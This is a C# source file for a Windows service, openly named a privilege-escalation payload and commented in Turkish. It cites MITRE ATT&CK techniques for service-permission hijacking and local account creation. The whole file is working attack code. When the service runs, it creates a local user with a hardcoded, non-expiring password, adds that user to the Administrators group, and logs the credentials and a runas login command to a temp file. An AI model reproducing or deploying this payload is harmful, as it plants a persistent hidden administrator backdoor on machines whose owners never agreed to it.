using System;
using System.IO;
using System.Runtime.InteropServices;
using System.ServiceProcess;

// PrivEscPayload v5 — Local Admin User Creation (P/Invoke)
// v5: Yeni local kullanici olusturup Administrators'a ekler
// v4: Domain kullaniciyi eklemeye calisti — domain SID resolve problemi vardi
// Service context'te child process olusturulamiyordu (SEP/Job Object)
// Bu versiyon tek process icinde her seyi yapar
// MITRE ATT&CK: T1574.011, T1543.003, T1136.001

public class PrivEscPayloadService : ServiceBase
{
    // netapi32.dll — NetUserAdd
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int NetUserAdd(
        string serverName,
        int level,
        ref USER_INFO_1 buf,
        out int parmError);

    // netapi32.dll — NetLocalGroupAddMembers
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int NetLocalGroupAddMembers(
        string serverName,
        string groupName,
        int level,
        ref LOCALGROUP_MEMBERS_INFO_3 buf,
        int totalEntries);

    // netapi32.dll — NetLocalGroupGetMembers (dogrulama icin)
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int NetLocalGroupGetMembers(
        string serverName,
        string groupName,
        int level,
        out IntPtr bufPtr,
        int prefMaxLen,
        out int entriesRead,
        out int totalEntries,
        IntPtr resumeHandle);

    // netapi32.dll — NetUserGetInfo (dogrulama icin)
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int NetUserGetInfo(
        string serverName,
        string userName,
        int level,
        out IntPtr bufPtr);

    [DllImport("netapi32.dll")]
    static extern int NetApiBufferFree(IntPtr buffer);

    // advapi32.dll — GetUserName (whoami yerine)
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool GetUserName(System.Text.StringBuilder lpBuffer, ref int nSize);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct USER_INFO_1
    {
        public string usri1_name;
        public string usri1_password;
        public int usri1_password_age;
        public int usri1_priv;        // USER_PRIV_USER = 1
        public string usri1_home_dir;
        public string usri1_comment;
        public int usri1_flags;        // UF_SCRIPT | UF_DONT_EXPIRE_PASSWD
        public string usri1_script_path;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct LOCALGROUP_MEMBERS_INFO_3
    {
        public string domainandname;
    }

    const int USER_PRIV_USER = 1;
    const int UF_SCRIPT = 0x0001;
    const int UF_DONT_EXPIRE_PASSWD = 0x10000;

    static string logFile = @"C:\Windows\Temp\privesc_result.txt";
    static string newUser = "audit01";
    static string newPass = "Aud1t@2026!Sec";

    public PrivEscPayloadService()
    {
        this.ServiceName = "PrivEscPayloadSvc";
        this.CanStop = true;
    }

    protected override void OnStart(string[] args)
    {
        try
        {
            LogMsg("=== PrivEscPayload v5 (Local Admin Creation) ===");
            LogMsg("PID: " + System.Diagnostics.Process.GetCurrentProcess().Id);

            // 1. Kim olarak calistigimizi goster
            int size = 256;
            System.Text.StringBuilder userName = new System.Text.StringBuilder(size);
            if (GetUserName(userName, ref size))
                LogMsg("Running as: " + userName.ToString());
            else
                LogMsg("Running as: GetUserName failed, err=" + Marshal.GetLastWin32Error());

            LogMsg("MachineName: " + Environment.MachineName);
            LogMsg("UserDomainName: " + Environment.UserDomainName);

            // 2. Yeni local kullanici olustur — NetUserAdd
            LogMsg("--- ADIM 1: Local kullanici olustur ---");
            LogMsg("Kullanici: " + newUser);

            USER_INFO_1 userInfo = new USER_INFO_1();
            userInfo.usri1_name = newUser;
            userInfo.usri1_password = newPass;
            userInfo.usri1_password_age = 0;
            userInfo.usri1_priv = USER_PRIV_USER;
            userInfo.usri1_home_dir = null;
            userInfo.usri1_comment = "Audit test account";
            userInfo.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
            userInfo.usri1_script_path = null;

            int parmError;
            int addResult = NetUserAdd(null, 1, ref userInfo, out parmError);
            LogMsg("NetUserAdd sonuc: " + addResult + " (" + NetErrorToString(addResult) + ")");

            if (addResult == 2224) // NERR_UserExists
            {
                LogMsg("Kullanici zaten mevcut — Administrators'a eklemeyi dene");
            }
            else if (addResult != 0)
            {
                LogMsg("HATA: Kullanici olusturulamadi! parmError=" + parmError);
                // Yine de devam et — belki zaten var
            }
            else
            {
                LogMsg("BASARILI: Local kullanici olusturuldu: " + newUser);
            }

            // 3. Kullaniciyi dogrula — NetUserGetInfo
            IntPtr userBuf;
            int infoResult = NetUserGetInfo(null, newUser, 1, out userBuf);
            if (infoResult == 0)
            {
                LogMsg("DOGRULAMA: Kullanici '" + newUser + "' mevcut");
                NetApiBufferFree(userBuf);
            }
            else
            {
                LogMsg("DOGRULAMA BASARISIZ: NetUserGetInfo=" + infoResult + " (" + NetErrorToString(infoResult) + ")");
            }

            // 4. Administrators grubuna ekle — NetLocalGroupAddMembers
            LogMsg("--- ADIM 2: Administrators grubuna ekle ---");

            string localUserName = Environment.MachineName + "\\" + newUser;
            LogMsg("Deneniyor: " + localUserName);

            LOCALGROUP_MEMBERS_INFO_3 member = new LOCALGROUP_MEMBERS_INFO_3();
            member.domainandname = localUserName;

            int grpResult = NetLocalGroupAddMembers(null, "Administrators", 3, ref member, 1);
            LogMsg("NetLocalGroupAddMembers sonuc: " + grpResult + " (" + NetErrorToString(grpResult) + ")");

            if (grpResult == 0)
                LogMsg("BASARILI: " + newUser + " Administrators grubuna eklendi!");
            else if (grpResult == 1378)
                LogMsg("ZATEN UYE: " + newUser + " Administrators grubunda");
            else
                LogMsg("HATA: Gruba eklenemedi");

            // 5. Dogrulama — Administrators grubunu listele
            LogMsg("--- ADIM 3: Administrators Grup Uyeleri ---");
            bool found = false;
            try
            {
                IntPtr bufPtr;
                int entriesRead, totalEntries;
                int ret = NetLocalGroupGetMembers(null, "Administrators", 3, out bufPtr,
                    -1, out entriesRead, out totalEntries, IntPtr.Zero);

                if (ret == 0 && bufPtr != IntPtr.Zero)
                {
                    IntPtr iter = bufPtr;
                    for (int i = 0; i < entriesRead; i++)
                    {
                        LOCALGROUP_MEMBERS_INFO_3 m = (LOCALGROUP_MEMBERS_INFO_3)Marshal.PtrToStructure(
                            iter, typeof(LOCALGROUP_MEMBERS_INFO_3));
                        LogMsg("  " + m.domainandname);

                        if (m.domainandname != null &&
                            m.domainandname.IndexOf(newUser, StringComparison.OrdinalIgnoreCase) >= 0)
                        {
                            LogMsg("  ^^^ " + newUser.ToUpper() + " BULUNDU — LOCAL ADMIN OLUSTURMA BASARILI ^^^");
                            found = true;
                        }

                        iter = new IntPtr(iter.ToInt64() + Marshal.SizeOf(typeof(LOCALGROUP_MEMBERS_INFO_3)));
                    }
                    NetApiBufferFree(bufPtr);
                }
                else
                {
                    LogMsg("NetLocalGroupGetMembers failed: " + ret);
                }
            }
            catch (Exception ex)
            {
                LogMsg("Dogrulama hatasi: " + ex.Message);
            }

            // 6. Sonuc ozeti
            LogMsg("=== SONUC ===");
            if (found)
            {
                LogMsg("PRIVESC BASARILI — Local admin olusturuldu");
                LogMsg("Kullanici: " + newUser);
                LogMsg("Sifre: " + newPass);
                LogMsg("Login komutu: runas /user:" + Environment.MachineName + "\\" + newUser + " cmd.exe");
            }
            else if (addResult == 0 || addResult == 2224)
            {
                LogMsg("KISMI BASARI — Kullanici olusturuldu ama Administrators grubuna eklenemedi");
            }
            else
            {
                LogMsg("BASARISIZ — Kullanici olusturulamadi");
            }

            LogMsg("=== TAMAMLANDI ===");
        }
        catch (Exception ex)
        {
            LogMsg("FATAL: " + ex.ToString());
        }

        // Servisi durdur
        new System.Threading.Thread(() =>
        {
            System.Threading.Thread.Sleep(3000);
            try { this.Stop(); } catch { }
        }).Start();
    }

    protected override void OnStop()
    {
        LogMsg("Service OnStop");
    }

    static string NetErrorToString(int code)
    {
        switch (code)
        {
            case 0:    return "NERR_Success";
            case 5:    return "ERROR_ACCESS_DENIED";
            case 87:   return "ERROR_INVALID_PARAMETER";
            case 1378: return "ERROR_MEMBER_IN_ALIAS (zaten uye)";
            case 1387: return "ERROR_MEMBER_NOT_IN_ALIAS";
            case 2220: return "NERR_GroupNotFound";
            case 2221: return "NERR_UserNotFound";
            case 2224: return "NERR_UserExists (zaten var)";
            case 2226: return "NERR_InvalidComputer";
            case 2245: return "NERR_PasswordTooShort";
            default:   return "Error " + code;
        }
    }

    static void LogMsg(string msg)
    {
        string line = "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "] " + msg;
        try { File.AppendAllText(logFile, line + Environment.NewLine); } catch { }
    }

    static void Main()
    {
        // Hemen log — process basladigini dogrula
        try
        {
            File.AppendAllText(logFile,
                "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "] Main() basladi — PID " +
                System.Diagnostics.Process.GetCurrentProcess().Id + Environment.NewLine);
        }
        catch { }

        ServiceBase.Run(new PrivEscPayloadService());
    }
}
